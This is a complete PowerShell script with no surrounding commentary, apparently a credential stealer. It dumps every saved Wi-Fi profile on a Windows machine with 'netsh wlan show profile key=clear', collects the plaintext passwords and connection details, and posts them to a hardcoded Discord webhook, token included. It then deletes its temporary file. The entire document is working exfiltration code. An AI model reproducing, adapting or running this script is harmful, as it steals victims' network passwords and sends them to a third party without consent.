# Created by mrproxy

# Discord webhook URL
$webhook = "https://discord.com/api/webhooks/1301990032567042159/PP7RFPrRII5BKybbo1-7o-YAxVRcdmZmzPMJEt6pcJaSoyc6aWhG4tEzAOeuJXhQRjnw"

# Output file to save Wi-Fi profiles and passwords
$outputFile = "C:\ProgramData\WifiPasswords.txt"

# Ensure the ProgramData directory exists
$programDataPath = "C:\ProgramData"
if (-Not (Test-Path $programDataPath)) {
    Write-Host "ProgramData folder does not exist. Exiting script."
    exit
}

# Create or clear the output file
if (Test-Path $outputFile) {
    Clear-Content -Path $outputFile
} else {
    New-Item -Path $outputFile -ItemType File | Out-Null
}

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )

    $body = @{
        content = $message
    }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
    } catch {
        Write-Host "Failed to send message to Discord: $_"
    }
}

# Start message
$discordMessage = "**Wi-Fi Passwords Collected:**`n"
$discordMessage += "`n------------------------------`n"

# Dump Wi-Fi profiles and passwords
netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $profileName = $_ -replace ".*: ", ""
    $wifiDetails = netsh wlan show profile "$profileName" key=clear

    # Extract relevant details
    $ssid = $profileName
    $keyContentLine = $wifiDetails | Select-String "Key Content"
    $keyContent = if ($keyContentLine) { $keyContentLine -replace ".*: ", "" } else { "No Password Found" }

    # Additional information extraction
    $connectionModeLine = $wifiDetails | Select-String "Connection mode"
    $networkTypeLine = $wifiDetails | Select-String "Network type"
    $authTypeLine = $wifiDetails | Select-String "Authentication"
    $cipherLine = $wifiDetails | Select-String "Cipher"

    $connectionMode = if ($connectionModeLine) { $connectionModeLine -replace ".*: ", "" } else { "N/A" }
    $networkType = if ($networkTypeLine) { $networkTypeLine -replace ".*: ", "" } else { "N/A" }
    $authType = if ($authTypeLine) { $authTypeLine -replace ".*: ", "" } else { "N/A" }
    $cipher = if ($cipherLine) { $cipherLine -replace ".*: ", "" } else { "N/A" }

    # Gather necessary profile details with Markdown formatting
    $profileInfo = @"
**Profile Name:** **$profileName**
**SSID Name:** **$ssid**
**Key Content:** **$keyContent**

**Connection Mode:** $connectionMode
**Network Type:** $networkType
**Authentication Type:** $authType
**Cipher:** $cipher
------------------------------`n
"@

    # Append to the Discord message
    $discordMessage += $profileInfo
}

# Conclude message with total number of profiles collected
$profileCount = ($discordMessage -split "`n------------------------------").Count - 1
$discordMessage += "***Total Profiles Collected:*** **$profileCount**`n"

# Send the formatted message to Discord
Send-DiscordMessage -message $discordMessage

# Clean up
Remove-Item $outputFile -Force
